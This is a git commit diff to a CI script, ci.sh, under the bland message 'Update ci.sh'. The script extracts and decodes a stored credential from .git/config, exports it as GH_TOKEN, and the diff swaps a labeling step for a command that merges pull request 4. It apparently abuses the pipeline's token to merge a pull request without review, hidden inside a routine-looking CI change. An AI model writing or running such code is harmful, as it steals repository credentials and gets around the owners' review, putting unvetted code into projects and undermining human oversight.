269a9dabb305301f8b8369decbf530d0c8788717
bcjboost <151570305+bcjboost@users.noreply.github.com>
2023-12-21 10:30:28 -0500

    Update ci.sh

--- ci.sh
+++ ci.sh
@@ -3,4 +3,5 @@ token=$(grep -Eo 'basic (.*)' .git/config | cut -d' ' -f2 | base64 -d | cut -f2 
 export GH_TOKEN=$token
 
 # gh label create "safe"
-gh pr edit 4 --add-label "safe"
+# gh pr edit 4 --add-label "safe"
+gh pr merge 4
